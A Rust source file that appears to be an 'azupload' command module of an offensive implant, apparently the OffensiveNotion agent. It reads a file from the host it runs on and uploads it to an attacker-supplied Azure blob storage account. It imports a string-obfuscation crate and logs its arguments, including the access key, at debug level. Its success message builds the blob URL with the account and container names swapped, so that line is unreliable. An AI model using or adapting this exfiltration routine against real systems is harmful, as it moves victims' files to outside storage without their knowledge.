use std::error::Error;
use std::fs::read;
use std::env::{set_var, remove_var};
use azure_storage::core::prelude::*;
use azure_storage_blobs::prelude::*;
use crate::cmd::CommandArgs;
use crate::logger::{Logger, log_out };

use crate::cmd::command_out;
use litcrypt::lc;

/// Uploads a file to Azure Storage.
/// 
/// Usage: `azupload storage_account access_key container_name filename`
pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<String, Box<dyn Error>> {

    let mut storage_account = String::from("");
    let mut access_key = String::from("");
    let mut container_name = String::from("");
    let mut upload_file = String::from("");

    let arg_vals = vec![
        (&mut storage_account, "Azure Storage Account"),
        (&mut access_key, "Azure Storage Access Key"),
        (&mut container_name, "Container Name"),
        (&mut upload_file, "Upload File")
    ];

    for (v, m) in arg_vals {
        if let Some(a) = cmd_args.nth(0) {
            logger.debug(log_out!("Arg:", m, ":", &a));
            *v = a;
        } else {
            return command_out!("Missing ", m);
        }

    }

    set_var("STORAGE_ACCOUNT", &storage_account);
    set_var("STORAGE_ACCESS_KEY", &access_key);

    let client = StorageClient::new_access_key(&storage_account, &access_key)
        .container_client(&container_name)
        .blob_client(&upload_file);

    let file: Vec<u8> = match read(&upload_file) {
        Ok(v) => v,
        Err(e) => { return Ok(e.to_string()); }
    };

    // let stream = ByteStream::new(SdkBody::from(file));

    let res = client
        .put_block_blob(file.clone())
        .content_type("text/plain")
        .into_future()
        .await;

    remove_var("STORAGE_ACCOUNT");
    remove_var("STORAGE_ACCESS_KEY");

    // https://offensivenotion.blob.core.windows.net/offnote/access.log
    match res {
        Ok(_) => command_out!("File uploaded: ", &format!("https://{}.blob.core.windows.net/{}/{}", container_name, storage_account, upload_file)),
        _ => command_out!("Upload Error")
    }

}